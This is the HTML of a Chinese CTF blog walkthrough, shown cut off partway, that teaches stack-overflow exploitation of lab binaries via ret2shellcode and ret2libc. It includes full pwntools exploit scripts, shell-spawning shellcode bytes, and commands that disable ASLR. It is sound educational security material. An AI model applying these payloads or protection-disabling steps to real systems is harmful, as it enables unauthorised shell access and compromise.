@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#494f5c">
+	<meta name="msapplication-TileColor" content="#494f5c">
+<meta itemprop="name" content="pwn实践记录--rop入门">
+<meta itemprop="description" content="回过来记录入门历程主要是为了复习巩固pwn的分析思路。因为写的很详细，篇幅很长，未写完的会第二天写。全部内容包括：ret2shellcode、ret2libc(绕过NX)、ret2libc(绕过ASLR)、格式化字符串漏洞。若理解有错误，请在评论区指正。
+本次回顾涉及到的elf文件以及exp都能在这里获取到。 环境准备：linux(32位程序运行环境)、IDA Pro、gdb插件、python&#43;pwntools、不屈意志:) 知识回顾：操作系统预防二进制漏洞的保护机制、elf文件组成、栈机制、大小端。
+0x00 return2shellcode 文件：level1 习惯性查看保护机制：
+很好全关，接下来利用IDA Pro F5大法查看反汇编结果： 发现该二进制文件main函数入口直接调用vulnerable_function()函数，然后调用了write函数。这里提个醒，反汇编遇到write()、read()、puts()、gets()一定留个心眼，这些函数对任意变量的处理都可能造成栈溢出，不过本题输出的是字符串常量，忽略，直接查看vulnerable_function()。 看到该函数创建了个局部变量（数组指针），位置距离ebp-0x88的位置，也就是距离基指针136字节位置。read()函数读取了该函数的局部变量，上文提到read()函数不检查读取限制，并且局部变量存放在栈中，因此我们可以构造payload长度=136&#43;4(存储ebp指针地址大小)&#43;4(返回地址大小), 来改变函数返回地址。考虑到PIE已关，并且140字节的长度足够存储一个shellcode执行execve(&quot;/bin/sh&quot;)。因此我们从payload的开始位置存shellcode，剩下的用&rsquo;A&rsquo;补全，返回地址指向payload起始地址，也就是局部变量的起始地址。但是地址我们还不知道，因为它是在栈里面加载的。考虑到栈的动态变化，IDAPro的静态分析无法展示（它的动态分析比较麻烦），接下来用gdb配合peta插件进行动态分析： 在入口函数下断点： run/start 执行到main函数入口停下： 依次 next next 在汇编下一步执行vulnerable_function()函数的时候，step命令进入函数内部： 进入之后，我们就能看到该函数的栈情况了 接下来依次next 执行到read()函数的时候，象征性输入字符： 可以看到栈区0xffffd060地址上存放了该局部变量（上面的0xffffd060是文字常量区（常量池）范围内的地址，主要存储字符串常量），至此所有的分析工作就完成了。
+接下来最最最关键的地方来了，很多初学者都会落进去的坑：其实gdb调试和实际执行程序的栈位置相比会有些偏移，为了提供buf更精确的位置，我们需要开启core dump功能来收集实际运行环境下的变量分布情况。 暂时开启core dump命令
+ulimit -c unlimited 执行level1:
+./level1 输入字符使栈溢出。 可以看到目录下多出来了个core文件。 接下来用gdb 配合core文件再次调试level1 然后输入 x $esp-144查看buf的位置, 这里的esp指的是实际环境下程序执行出错的时候的esp, 执行返回命令时，esp退回到main函数的栈顶，因此buf的位置 = esp指针存的位置 - payload的长度(144)。 得到buf实际地址：0xffffd0c0 接下来我们就能安心的写exp了。
+from pwn import * p = process(&#39;./level1&#39;) ret = 0xffffd0c0 shellcode = &#34;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&#34; shellcode &#43;= &#34;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&#34; shellcode &#43;= &#34;\x0b\xcd\x80&#34; payload = shellcode &#43; &#39;A&#39; * (140 - len(shellcode)) &#43; p32(ret) p."><meta itemprop="datePublished" content="2020-03-07T21:43:55+08:00" />
+<meta itemprop="dateModified" content="2020-03-07T21:43:55+08:00" />
+<meta itemprop="wordCount" content="433">
+<meta itemprop="keywords" content="ctf,pwn," /><meta property="og:title" content="pwn实践记录--rop入门" />
+<meta property="og:description" content="回过来记录入门历程主要是为了复习巩固pwn的分析思路。因为写的很详细，篇幅很长，未写完的会第二天写。全部内容包括：ret2shellcode、ret2libc(绕过NX)、ret2libc(绕过ASLR)、格式化字符串漏洞。若理解有错误，请在评论区指正。
+本次回顾涉及到的elf文件以及exp都能在这里获取到。 环境准备：linux(32位程序运行环境)、IDA Pro、gdb插件、python&#43;pwntools、不屈意志:) 知识回顾：操作系统预防二进制漏洞的保护机制、elf文件组成、栈机制、大小端。
+0x00 return2shellcode 文件：level1 习惯性查看保护机制：
+很好全关，接下来利用IDA Pro F5大法查看反汇编结果： 发现该二进制文件main函数入口直接调用vulnerable_function()函数，然后调用了write函数。这里提个醒，反汇编遇到write()、read()、puts()、gets()一定留个心眼，这些函数对任意变量的处理都可能造成栈溢出，不过本题输出的是字符串常量，忽略，直接查看vulnerable_function()。 看到该函数创建了个局部变量（数组指针），位置距离ebp-0x88的位置，也就是距离基指针136字节位置。read()函数读取了该函数的局部变量，上文提到read()函数不检查读取限制，并且局部变量存放在栈中，因此我们可以构造payload长度=136&#43;4(存储ebp指针地址大小)&#43;4(返回地址大小), 来改变函数返回地址。考虑到PIE已关，并且140字节的长度足够存储一个shellcode执行execve(&quot;/bin/sh&quot;)。因此我们从payload的开始位置存shellcode，剩下的用&rsquo;A&rsquo;补全，返回地址指向payload起始地址，也就是局部变量的起始地址。但是地址我们还不知道，因为它是在栈里面加载的。考虑到栈的动态变化，IDAPro的静态分析无法展示（它的动态分析比较麻烦），接下来用gdb配合peta插件进行动态分析： 在入口函数下断点： run/start 执行到main函数入口停下： 依次 next next 在汇编下一步执行vulnerable_function()函数的时候，step命令进入函数内部： 进入之后，我们就能看到该函数的栈情况了 接下来依次next 执行到read()函数的时候，象征性输入字符： 可以看到栈区0xffffd060地址上存放了该局部变量（上面的0xffffd060是文字常量区（常量池）范围内的地址，主要存储字符串常量），至此所有的分析工作就完成了。
+接下来最最最关键的地方来了，很多初学者都会落进去的坑：其实gdb调试和实际执行程序的栈位置相比会有些偏移，为了提供buf更精确的位置，我们需要开启core dump功能来收集实际运行环境下的变量分布情况。 暂时开启core dump命令
+ulimit -c unlimited 执行level1:
+./level1 输入字符使栈溢出。 可以看到目录下多出来了个core文件。 接下来用gdb 配合core文件再次调试level1 然后输入 x $esp-144查看buf的位置, 这里的esp指的是实际环境下程序执行出错的时候的esp, 执行返回命令时，esp退回到main函数的栈顶，因此buf的位置 = esp指针存的位置 - payload的长度(144)。 得到buf实际地址：0xffffd0c0 接下来我们就能安心的写exp了。
+from pwn import * p = process(&#39;./level1&#39;) ret = 0xffffd0c0 shellcode = &#34;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&#34; shellcode &#43;= &#34;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&#34; shellcode &#43;= &#34;\x0b\xcd\x80&#34; payload = shellcode &#43; &#39;A&#39; * (140 - len(shellcode)) &#43; p32(ret) p." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shankisme.com/posts/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-03-07T21:43:55+08:00" />
+<meta property="article:modified_time" content="2020-03-07T21:43:55+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="pwn实践记录--rop入门"/>
+<meta name="twitter:description" content="回过来记录入门历程主要是为了复习巩固pwn的分析思路。因为写的很详细，篇幅很长，未写完的会第二天写。全部内容包括：ret2shellcode、ret2libc(绕过NX)、ret2libc(绕过ASLR)、格式化字符串漏洞。若理解有错误，请在评论区指正。
+本次回顾涉及到的elf文件以及exp都能在这里获取到。 环境准备：linux(32位程序运行环境)、IDA Pro、gdb插件、python&#43;pwntools、不屈意志:) 知识回顾：操作系统预防二进制漏洞的保护机制、elf文件组成、栈机制、大小端。
+0x00 return2shellcode 文件：level1 习惯性查看保护机制：
+很好全关，接下来利用IDA Pro F5大法查看反汇编结果： 发现该二进制文件main函数入口直接调用vulnerable_function()函数，然后调用了write函数。这里提个醒，反汇编遇到write()、read()、puts()、gets()一定留个心眼，这些函数对任意变量的处理都可能造成栈溢出，不过本题输出的是字符串常量，忽略，直接查看vulnerable_function()。 看到该函数创建了个局部变量（数组指针），位置距离ebp-0x88的位置，也就是距离基指针136字节位置。read()函数读取了该函数的局部变量，上文提到read()函数不检查读取限制，并且局部变量存放在栈中，因此我们可以构造payload长度=136&#43;4(存储ebp指针地址大小)&#43;4(返回地址大小), 来改变函数返回地址。考虑到PIE已关，并且140字节的长度足够存储一个shellcode执行execve(&quot;/bin/sh&quot;)。因此我们从payload的开始位置存shellcode，剩下的用&rsquo;A&rsquo;补全，返回地址指向payload起始地址，也就是局部变量的起始地址。但是地址我们还不知道，因为它是在栈里面加载的。考虑到栈的动态变化，IDAPro的静态分析无法展示（它的动态分析比较麻烦），接下来用gdb配合peta插件进行动态分析： 在入口函数下断点： run/start 执行到main函数入口停下： 依次 next next 在汇编下一步执行vulnerable_function()函数的时候，step命令进入函数内部： 进入之后，我们就能看到该函数的栈情况了 接下来依次next 执行到read()函数的时候，象征性输入字符： 可以看到栈区0xffffd060地址上存放了该局部变量（上面的0xffffd060是文字常量区（常量池）范围内的地址，主要存储字符串常量），至此所有的分析工作就完成了。
+接下来最最最关键的地方来了，很多初学者都会落进去的坑：其实gdb调试和实际执行程序的栈位置相比会有些偏移，为了提供buf更精确的位置，我们需要开启core dump功能来收集实际运行环境下的变量分布情况。 暂时开启core dump命令
+ulimit -c unlimited 执行level1:
+./level1 输入字符使栈溢出。 可以看到目录下多出来了个core文件。 接下来用gdb 配合core文件再次调试level1 然后输入 x $esp-144查看buf的位置, 这里的esp指的是实际环境下程序执行出错的时候的esp, 执行返回命令时，esp退回到main函数的栈顶，因此buf的位置 = esp指针存的位置 - payload的长度(144)。 得到buf实际地址：0xffffd0c0 接下来我们就能安心的写exp了。
+from pwn import * p = process(&#39;./level1&#39;) ret = 0xffffd0c0 shellcode = &#34;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&#34; shellcode &#43;= &#34;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&#34; shellcode &#43;= &#34;\x0b\xcd\x80&#34; payload = shellcode &#43; &#39;A&#39; * (140 - len(shellcode)) &#43; p32(ret) p."/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>pwn实践记录--rop入门</title>
+	<link rel="stylesheet" href="https://shankisme.com/css/style.min.b1b8a0e19eabe0807fd81b41979d5ea6898b9d3e8cc583d45a28ff5f7e79e10d.css" integrity="sha256-sbig4Z6r4IB/2BtBl51epomLnT6MxYPUWij/X3554Q0=" crossorigin="anonymous">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://shankisme.com">shank</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://shankisme.com/posts/">Posts</a>
+				<a href="https://shankisme.com/about/">About</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<button id="theme-btn" class="hdr-btn dark">
+					<svg xmlns="http://www.w3.org/2000/svg" class="feather sun" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+					<svg xmlns="http://www.w3.org/2000/svg" class="feather moon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+				</button>
+				<span class="hdr-social hide-in-mobile"><a href="mailto:845700113@qq.com" target="_blank" rel="noopener me" title="Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a><a href="https://github.com/tonyshanc" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://shankisme.com/posts/">Posts</a></li>
+			<li><a href="https://shankisme.com/about/">About</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>Mar 7, 2020</span></div>
+				<h1>pwn实践记录--rop入门</h1>
+			</header>
+			<div class="content">
+				<p><img src="1.jpg" alt="/img/pwn/1.jpg">
+回过来记录入门历程主要是为了复习巩固pwn的分析思路。因为写的很详细，篇幅很长，未写完的会第二天写。全部内容包括：ret2shellcode、ret2libc(绕过NX)、ret2libc(绕过ASLR)、格式化字符串漏洞。若理解有错误，请在评论区指正。</p>
+<p>本次回顾涉及到的elf文件以及exp都能在<a href="https://github.com/TonyShanc/new2pwn">这里</a>获取到。
+环境准备：linux(32位程序运行环境)、IDA Pro、gdb插件、python+pwntools、不屈意志:)
+知识回顾：<a href="https://blog.csdn.net/RChaos/article/details/104344276">操作系统预防二进制漏洞的保护机制</a>、elf文件组成、栈机制、大小端。</p>
+<h4 id="0x00-return2shellcode">0x00 return2shellcode<a href="#0x00-return2shellcode" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<p>文件：level1
+习惯性查看保护机制：</p>
+<p>很好全关，接下来利用IDA Pro F5大法查看反汇编结果：
+<img src="/img/pwn/3.jpg" alt="3.jpg">
+发现该二进制文件main函数入口直接调用vulnerable_function()函数，然后调用了write函数。这里提个醒，反汇编遇到write()、read()、puts()、gets()一定留个心眼，这些函数对任意变量的处理都可能造成栈溢出，不过本题输出的是字符串常量，忽略，直接查看vulnerable_function()。
+<img src="/img/pwn/4.jpg" alt="4.jpg">
+看到该函数创建了个局部变量（数组指针），位置距离ebp-0x88的位置，也就是距离基指针136字节位置。read()函数读取了该函数的局部变量，上文提到read()函数不检查读取限制，并且局部变量存放在栈中，因此我们可以构造payload长度=136+4(存储ebp指针地址大小)+4(返回地址大小), 来改变函数返回地址。考虑到PIE已关，并且140字节的长度足够存储一个shellcode执行execve(&quot;/bin/sh&quot;)。因此我们从payload的开始位置存shellcode，剩下的用&rsquo;A&rsquo;补全，返回地址指向payload起始地址，也就是局部变量的起始地址。但是地址我们还不知道，因为它是在栈里面加载的。考虑到栈的动态变化，IDAPro的静态分析无法展示（它的动态分析比较麻烦），接下来用<strong>gdb配合peta插件</strong>进行动态分析：
+在入口函数下断点：
+<img src="/img/pwn/5.jpg" alt="5.jpg">
+run/start 执行到main函数入口停下：
+<img src="/img/pwn/6.jpg" alt="6.jpg">
+依次
+next  next
+在汇编下一步执行vulnerable_function()函数的时候，step命令进入函数内部：
+<img src="/img/pwn/7.jpg" alt="7.jpg">
+进入之后，我们就能看到该函数的栈情况了
+接下来依次next 执行到read()函数的时候，象征性输入字符：
+<img src="/img/pwn/8.jpg" alt="8.jpg">
+可以看到栈区0xffffd060地址上存放了该局部变量（上面的0xffffd060是文字常量区（常量池）范围内的地址，主要存储字符串常量），至此所有的分析工作就完成了。</p>
+<p>接下来最最最关键的地方来了，很多初学者都会落进去的坑：其实gdb调试和实际执行程序的栈位置相比会有些偏移，为了提供buf更精确的位置，我们需要开启core dump功能来收集实际运行环境下的变量分布情况。
+暂时开启core dump命令</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">ulimit</span> -c unlimited
+</code></pre></div><p>执行level1:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">./level1
+</code></pre></div><p>输入字符使栈溢出。
+可以看到目录下多出来了个core文件。
+接下来用gdb 配合core文件再次调试level1
+然后输入<code> x $esp-144</code>查看buf的位置, 这里的esp指的是实际环境下程序执行出错的时候的esp, 执行返回命令时，esp退回到main函数的栈顶，因此buf的位置 = esp指针存的位置 - payload的长度(144)。
+<img src="/img/pwn/10.jpg" alt="8.jpg">
+得到buf实际地址：0xffffd0c0
+接下来我们就能安心的写exp了。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level1&#39;</span><span class="p">)</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0xffffd0c0</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73</span><span class="s2">&#34;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0</span><span class="s2">&#34;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x0b\xcd\x80</span><span class="s2">&#34;</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">140</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div><p>效果如下：
+<img src="/img/pwn/9.jpg" alt="8.jpg"></p>
+<h4 id="0x01-ret2libc绕过nx">0x01 ret2libc(绕过NX)<a href="#0x01-ret2libc绕过nx" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<p>文件：level2
+保护：NX
+查看保护机制：
+<img src="/img/pwn/11.jpg" alt="8.jpg">
+PIE(ASLR)是系统保护，有时查看文件保护机制虽然显示enabled , 但其实是开着的，保险起见，我们可以用：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cat /proc/sys/kernel/randomize_va_space
+</code></pre></div><p>或者多次ldd &lt;filename&gt;查看地址偏移情况:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ldd level2
+</code></pre></div><p>修改用重定向就行了：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo -s
+<span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
+</code></pre></div><p>NX开启，栈数据段没有执行权限，因此不能将shellcode存在栈上。考虑到PIE(ASLR)没开，libc动态链接库中有execve()函数，并且存在&quot;/bin/sh&quot;字符串，接下来的思路就是覆盖返回地址，执行libc中的execve()或system(), 并将指向&quot;/bin/sh&quot;的指针作为函数的参数。
+用IDA Pro打开，反汇编并整理成C代码，发现代码和上一题是一样的，知识NX没开；
+<img src="/img/pwn/3.jpg" alt="6.jpg">
+<img src="/img/pwn/4.jpg" alt="6.jpg">
+下面要做的工作是：调试level2，在libc动态链接库载入之后，找到两个系统函数和&quot;/bin/sh&quot;的地址。
+在main()处设断点后，运行。
+此时libc动态库已经载入了，然后用print 和 find命令分别查找函数和字符串的地址：
+<img src="/img/pwn/12.jpg" alt="6.jpg">
+<img src="/img/pwn/13.jpg" alt="6.jpg">
+<img src="/img/pwn/14.jpg" alt="6.jpg">
+下面是这道题的关键，传递的&quot;/bin/sh&quot;应该放在payload的哪个位置？
+答：在返回地址的下一个高地址位。
+这个问题我之前在调试信息里分析了好久，终于找到了比较合理的解释(后来才发现是我栈机制没完全看明白。。)。
+我们先借助main()函数内部的write()调用过程来看看它的参数传递过程：
+<img src="/img/pwn/16.jpg" alt="6.jpg">
+<img src="/img/pwn/15.jpg" alt="6.jpg">
+容易看出，执行call 0x8048340 &lt;write@plt&gt; (plt下一题会讲到) 后，栈中存进了该汇编指令的下一个指令的地址，也就是write()的返回地址。细看，又会发现write函数的三个参数，在调用call指令之前就已经压栈了，压栈顺序是参数从右到左的顺序。对应的汇编指令如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">0x804843b &lt;main+14&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0xd
+0x8048443 &lt;main+22&gt;:	mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8048530
+0x804844b &lt;main+30&gt;:	mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x1
+</code></pre></div><p><img src="/img/pwn/17.jpg" alt="6.jpg">
+因此可以这样总结：函数参数先逆序入栈，接下来才标记返回地址和执行被调用函数汇编指令。
+分析完后，看看execve()和system()的传参要求：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">int execve<span class="o">(</span>const char *filename, char *const argv<span class="o">[]</span>, char *const envp<span class="o">[])</span><span class="p">;</span>
+int system<span class="o">(</span>const char * string<span class="o">)</span><span class="p">;</span>
+</code></pre></div><p>发现system只要求一个文件名字符串指针，本着谁参数少欺负谁的态度，盘它！
+构造payload: <code>payload = 'A' *140 + sys_addr + 'A' * 4 + binsh_addr</code>
+注意！这里&rsquo;A' * 4 是因为返回地址是直接到system函数内部的，没有经过call &lt;system@plt&gt;, 返回地址未压栈, 但是栈不知道，它还会认为有个返回地址，因此这里的‘A’ * 4是填补返回地址用的，如果你还想在返回时做进一步的事情，可以写个确切的地址。</p>
+<p>这里说一句：这里不用像上一题产生core dump ，因为返回地址不在栈中，没有地址偏移影响。
+exp如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level2&#39;</span><span class="p">)</span>
+<span class="c1">#p = remote(&#39;127.0.0.1&#39;,10002)</span>
+<span class="n">sys_addr</span><span class="o">=</span><span class="mh">0xf7e138b0</span>
+<span class="n">binsh_addr</span><span class="o">=</span><span class="mh">0xf7f5e42d</span>
+<span class="n">payload</span> <span class="o">=</span>  <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div><p>结果如下：
+<img src="/img/pwn/19.jpg" alt="6.jpg"></p>
+<h4 id="0x02-ret2libc绕过aslrpie">0x02 ret2libc(绕过ASLR/PIE)<a href="#0x02-ret2libc绕过aslrpie" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<p>文件：还是level2
+保护：ASLR NX
+下面我们把系统ASLR/PIE防护开启：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo -s
+<span class="nb">echo</span> <span class="m">2</span> &gt;  /proc/sys/kernel/randomize_va_space
+</code></pre></div><p><img src="/img/pwn/20.jpg" alt="figure">
+这里就不能像上题那样将返回地址覆盖成libc库函数的地址了，因为每次执行libc的地址会有一定的偏移，但我们仍然能定位到libc库函数的地址。具体怎么做呢？
+level2内的vulnerable_function()内调用read函数时，执行了call &lt;read@plt&gt;指令，plt是什么呢？<a href="https://www.freebuf.com/articles/system/135685.html">这里</a>有详细的解释。文章内我只简单解释。。
+我们先读取level2文件的elf结构：
+<img src="/img/pwn/21.jpg" alt="figure">
+发现.plt段在level2文件内，和程序段.text是分开的。
+这里就不放图了，不知道为什么我step进call &lt;write@plt&gt;的时候直接跳到了write汇编程序地址，立个flag, 有空补上。
+简单的说，plt是个跳转表 跳转到got表中read函数地址指针所在的区域，然后在got表内再跳转，最终才会跳转到write函数的地址。这种链接采用的是延迟绑定技术，执行第一个libc库函数时，libc才会链接到到level2，由于我们在vulnerable_function()中执行了read(),write()地址也就固定了。（整个过程我也不是很清楚，如果你想深入了解还得多看看其他资料）。</p>
+<p>下面说说绕过ASLR/PIE的思路：
+上文提到：调用libc库函数采用延迟绑定技术，执行第一个libc库函数时，libc才会链接到到level2，由于我们在vulnerable_function()中执行了read(),write()地址也就固定了。因此第一步是先获取到write函数真正的地址，记为write_addr。由于write()和system()在libc中的相对位置是固定的，也就是说它们之间的偏移量固定，因此我们就可以先事先获取偏移量，然后借助read函数作为跳板，就能得到system()的地址sys_addr了。同样的&quot;/bin/sh&quot;的地址也能固定，binsh_addr也出来了。
+exp如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;level2&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level2&#39;</span><span class="p">)</span>
+<span class="c1">#p = remote(&#39;127.0.0.1&#39;, 10003)</span>
+<span class="n">plt_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+<span class="nb">print</span> <span class="s1">&#39;plt_write= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">plt_write</span><span class="p">)</span>
+<span class="n">got_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+<span class="nb">print</span> <span class="s1">&#39;got_write= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span>
+<span class="n">vulfun_addr</span> <span class="o">=</span> <span class="mh">0x08048404</span>
+<span class="nb">print</span> <span class="s1">&#39;vulfun= &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">vulfun_addr</span><span class="p">)</span>
